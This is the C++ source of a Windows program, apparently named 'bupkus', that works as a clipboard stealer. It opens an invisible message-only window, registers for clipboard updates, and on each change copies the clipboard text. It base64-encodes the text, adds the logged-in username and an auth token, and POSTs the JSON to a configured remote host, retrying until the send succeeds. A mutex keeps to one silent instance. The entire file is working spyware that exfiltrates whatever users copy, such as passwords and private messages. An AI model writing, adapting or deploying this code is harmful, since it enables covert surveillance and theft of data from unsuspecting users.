#include <Windows.h>
#include <wincrypt.h>
#include <WinUser.h>

#include <stdio.h>

#include <monstars/http.h>
#include <monstars/logging.h>
#include <monstars/memory.h>
#include <monstars/mutex.h>
#include <monstars/object.h>
#include <monstars/util.h>

#include "bupkus.h"


HWND g_Window = nullptr;


DWORD SendClipboardText(void*)
{
    bool clipboard = false;
    int attempts = c_ClipboardAttempts;
    int wait_amount = c_ClipboardInterval;
    do
    {
        if (OpenClipboard(g_Window))
        {
            clipboard = true;
            break;
        }
        if (--attempts)
        {
            Sleep(wait_amount);
            wait_amount *= c_ClipboardBackoff;
        }
    } while (attempts);

    if (!clipboard)
    {
        LOG_LINE_ERROR;
        return ERROR_CLIPBOARD_NOT_OPEN;
    }

    monstars::HeapBuffer textBuf;
    if (HANDLE data = GetClipboardData(CF_TEXT))  // never close data handle
    {
        auto text = static_cast<char*>(GlobalLock(data));
        if (text)
        {
            size_t textLen = strlen(text);
            textBuf.Resize(textLen + 1);
            monstars::memcpy(textBuf.Get<void>(), textBuf.Size(), text, textLen);
            GlobalUnlock(text);  // always unlock
        }
    }
    CloseClipboard();  // always close the clipboard
    if (!textBuf)
    {
        LOG_LINE_ERROR;
        return ERROR_NO_DATA;
    }

    // convert the text to base64 (avoids json encoding problems)
    DWORD enc_size = 0;
    (void)CryptBinaryToStringA(textBuf.Get<byte>(), static_cast<DWORD>(textBuf.Size()),
                               CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &enc_size);
    monstars::HeapBuffer encBuf(static_cast<size_t>(enc_size) + 1);
    if (!enc_size || !CryptBinaryToStringA(textBuf.Get<byte>(), static_cast<DWORD>(textBuf.Size()),
                                           CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encBuf.Get(), &enc_size))
    {
        LOG_LINE_ERROR;
        return ERROR_ENCRYPTION_FAILED;
    }

    // grab current username for the json payload
    char username[MAX_PATH];
    DWORD nameSize = sizeof(username);
    (void)GetUserNameA(username, &nameSize);

    // construct the json payload
    size_t jsonSize = snprintf(nullptr, 0, c_JsonTemplate, c_AuthToken, username, encBuf.Get());
    if (jsonSize < 1)
    {
        LOG_LINE_ERROR;
        return ERROR_BAD_LENGTH;
    }
    monstars::HeapBuffer jsonBuf(jsonSize + 1);
    snprintf(jsonBuf.Get(), jsonBuf.Size(), c_JsonTemplate, c_AuthToken, username, encBuf.Get());

    // send the POST request
    attempts = c_ConnectAttempts;
    do
    {
        monstars::HttpClient client(c_Hostname);
        if (client.PostRequest(c_Endpoint, jsonBuf.Get(), strnlen(jsonBuf.Get(), jsonBuf.Size()), c_ContentType))
        {
            return ERROR_SUCCESS;
        }
        if (client.Forbidden())
        {
            return ERROR_ACCESS_DENIED;
        }
        if (--attempts) Sleep(c_ConnectInterval);
    } while (attempts);

    return ERROR_TIMEOUT;
}


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
{
    monstars::ObjectHandle bupkus = OpenMutexW(SYNCHRONIZE, false, c_AuthToken);
    if (bupkus)
    {
        ExitProcess(ERROR_ALREADY_EXISTS);
    }
    bupkus = CreateMutexW(nullptr, true, c_AuthToken);

    g_Window = CreateWindowExW(WS_EX_NOACTIVATE, L"STATIC", nullptr, WS_OVERLAPPEDWINDOW, 0, 0,
                               0, 0, HWND_MESSAGE, nullptr, hInstance, nullptr);

    if (!AddClipboardFormatListener(g_Window))
    {
        LOG_LINE_ERROR;
        return ERROR_NOT_READY;
    }

    while (true)
    {
        monstars::Cooldown cooldown(c_PasteCooldownTime);

        static MSG msg = {};

        switch (GetMessageW(&msg, nullptr, 0, 0))
        {
        case -1:
        case 0:
            break;
        default:
            if (msg.message == WM_CLIPBOARDUPDATE)
            {
                if (IsClipboardFormatAvailable(CF_UNICODETEXT) && cooldown)
                {
                    monstars::ObjectHandle thread = CreateThread(nullptr, 0, SendClipboardText, nullptr, 0, nullptr);
                }
            }
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    return ERROR_SUCCESS;
}